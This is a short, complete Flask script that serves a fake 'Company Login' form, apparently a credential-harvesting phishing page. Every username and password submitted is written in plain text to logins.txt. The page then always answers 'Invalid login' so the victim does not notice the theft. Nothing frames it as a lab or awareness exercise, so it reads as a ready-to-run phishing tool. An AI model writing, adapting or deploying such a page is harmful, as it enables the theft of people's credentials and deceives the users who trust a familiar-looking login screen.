from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <h2>Company Login</h2>
    <form method="POST" action="/login">
        <input name="username" placeholder="username"><br>
        <input name="password" type="password" placeholder="password"><br>
        <button>Login</button>
    </form>
    '''

@app.route('/login', methods=['POST'])
def login():
    u = request.form['username']
    p = request.form['password']

    with open('logins.txt', 'a') as f:
        f.write(f"{u}:{p}\n")

    return "Invalid login"

app.run(host='0.0.0.0', port=5000)
